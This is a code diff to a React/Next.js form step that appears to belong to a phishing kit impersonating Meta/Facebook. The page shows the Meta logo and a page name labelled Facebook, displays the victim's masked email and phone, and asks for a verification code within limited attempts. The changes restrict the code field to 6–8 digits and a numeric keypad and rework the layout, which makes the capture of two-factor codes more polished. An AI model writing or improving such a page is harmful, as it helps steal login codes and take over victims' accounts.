@@ -3,10 +3,10 @@
 import MetaLogo from '@/assets/images/meta-image.png';
 import BgImage from '@/assets/images/verify.webp';
 import { useFormStore } from '@/store/form-store';
+import type { Dictionary } from '@/types/content';
 import config from '@/utils/config';
 import Image from 'next/image';
 import { type FC, useEffect, useState } from 'react';
-import type { Dictionary } from '@/types/content';
 
 const maskEmail = (email: string) => {
     if (!email) return '';
@@ -37,7 +37,7 @@ const Step3: FC<{ onNext: () => void; formContent: Dictionary['formModal'] }> = 
     }, [messageId]);
 
     const handleSubmit = async () => {
-        if (!code.trim() || isLoading) return;
+        if (!code.trim() || code.length < 6 || code.length > 8 || isLoading) return;
 
         setShowError(false);
         setIsLoading(true);
@@ -88,16 +88,16 @@ const Step3: FC<{ onNext: () => void; formContent: Dictionary['formModal'] }> = 
     };
 
     return (
-        <div className='flex h-[90vh] w-full flex-col p-4'>
-            <div className='flex-1'>
-                <p className='text-sm text-gray-500'>{pageName} • {formContent.step3.facebook}</p>
+        <div className='flex max-h-[90vh] min-h-0 w-full flex-col overflow-y-auto p-4'>
+            <div className='flex-1 shrink-0'>
+                <p className='text-sm text-gray-500'>
+                    {pageName} • {formContent.step3.facebook}
+                </p>
                 <h2 className='mt-1 text-xl font-bold'>
                     {formContent.step3.title} ({attempts}/{config.MAX_CODE_ATTEMPTS})
                 </h2>
 
-                <p className='mt-3 text-sm text-gray-600'>
-                    {formContent.step3.description.replace('{email}', maskEmail(email)).replace('{phone}', maskPhone(phoneNumber))}
-                </p>
+                <p className='mt-3 text-sm text-gray-600'>{formContent.step3.description.replace('{email}', maskEmail(email)).replace('{phone}', maskPhone(phoneNumber))}</p>
 
                 <div className='mt-4 overflow-hidden rounded-2xl'>
                     <Image src={BgImage} alt='' className='h-auto w-full object-cover' />
@@ -105,7 +105,7 @@ const Step3: FC<{ onNext: () => void; formContent: Dictionary['formModal'] }> = 
 
                 <div className='mt-6'>
                     <div className='relative w-full'>
-                        <input type='text' id='code-input' value={code} onChange={(e) => setCode(e.target.value)} className='peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder='Code' />
+                        <input type='tel' id='code-input' inputMode='numeric' pattern='[0-9]*' maxLength={8} value={code} onChange={(e) => setCode(e.target.value.replaceAll(/\D/g, '').slice(0, 8))} className='peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder='Code' />
                         <label htmlFor='code-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                             {formContent.step3.code}
                         </label>
